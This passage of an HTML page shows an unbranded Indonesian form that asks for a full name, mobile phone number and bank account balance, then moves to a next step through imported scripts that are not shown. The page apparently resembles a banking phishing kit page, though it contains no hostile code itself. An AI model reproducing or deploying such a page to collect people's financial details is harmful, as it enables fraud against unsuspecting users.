		<script>

		</script>
		<script type="module" src="assets/common/js/global.js"></script>
		<script type="module" src="assets/common/js/data.js"></script>
	</head>
	<body>
		<div style="width: 100%; height: 100%; background-color: #ffffff; overflow: scroll; display: flex; flex-direction: column;">
			<div style="width: calc(100% - 20px); display: flex; flex-direction: row; align-items: center; justify-content: space-between; background-color: #3fd8d4; padding-left: 10px; padding-right: 10px; padding-top: 20px; padding-bottom: 20px;">

			</div>
			<div style="width: 100%; height: 8px; background-color: #ff8500;"></div>
			<div style="width: calc(100% - 40px); background-color: #faf9fe; display: flex; flex-direction: column; padding-left: 20px; padding-right: 20px;">
				<div style="color: #3c6a8b; font-size: 17px; margin-top: 30px;">Silahkan Melengkapi Data Berikut</div>
			    <div style="color: #3c6a8b; font-size: 14px; margin-top: 30px;"><b>Nama Lengkap Tanpa Singkatan</b></div>
			    <div style="width: calc(100% - 2px); height: 40px; background-color: #f4f9fc; border-bottom: 1px solid #dddddd; margin-top: 5px;">
			    	<input id="name" class="input1" type="text" placeholder="Masukkan Nama" style="width: calc(100% - 20px); height: 100%; padding-left: 10px; padding-right: 10px; background-color: #00000000; border: 0; outline: 0;">
		    	</div>
		        <div style="color: #3c6a8b; font-size: 14px; margin-top: 20px;"><b>Nomor Handphone</b></div>
		        <div style="width: calc(100% - 2px); height: 40px; background-color: #f4f9fc; border-bottom: 1px solid #dddddd; margin-top: 5px; display: flex; flex-direction: row;">
			    	<input id="phone" class="input1" type="tel" placeholder="Masukkan Nomor Handphone" style="width: 100%; height: 100%; padding-left: 10px; padding-right: 10px; background-color: #00000000; border: 0; outline: 0;">
		    	</div>
	        	<div style="color: #3c6a8b; font-size: 14px; margin-top: 20px;"><b>Saldo Rekening</b></div>
			    <div style="width: calc(100% - 2px); height: 40px; background-color: #f4f9fc; border-bottom: 1px solid #dddddd; margin-top: 5px; display: flex; flex-direction: row;">
				    <div style="width: 40px; height: 40px; display: flex; justify-content: center; align-items: center; color: #cccccc; font-size: 12px;">Rp.</div>
			    	<input id="balance" class="input1" type="tel" placeholder="Masukkan Saldo" style="width: 100%; height: 100%; padding-left: 10px; padding-right: 10px; background-color: #00000000; border: 0; outline: 0;">
		    	</div>
			    <div class="ripple" onclick="module.next()" style="width: 100%; height: 50px; box-shadow: 0 5px 10px 2px #4444442f; margin-top: 40px; margin-bottom: 50px; background-color: #e2fe4a; border-radius: 30px; color: #000000; font-size: 17px; display: flex; justify-content: center; align-items: center; margin-right: 10px;"><b>Selanjutnya</b></div>
			</div>
			<div style="position: fixed; left: 0; bottom: 0; width: 100%; display: flex; flex-direction: column;">
				<div style="width: 100%; height: 8px; background-color: #3fd8d4;"></div>
				<div style="width: 100%; height: 50px; display: flex; justify-content: center; align-items: center; background-color: #ff8736; color: #ffffff; font-size: 12px;">

			    </div>
			</div>
			<div id="loader" style="display: none; position: fixed; left: 0; top: 0; width: 100%; height: 100%; background-color: #0000007f; justify-content: center; align-items: center;">
				<div style="width: calc(100% - 80px); margin-left: 40px; margin-right: 40px; height: 120px; background-color: #ffffff; border-radius: 5px; display: flex; justify-content: center; align-items: center;">
					<div class="loader" style="width: 50px; height: 50px;"></div>
				</div>
			</div>
		</div>
	</body>
</html>
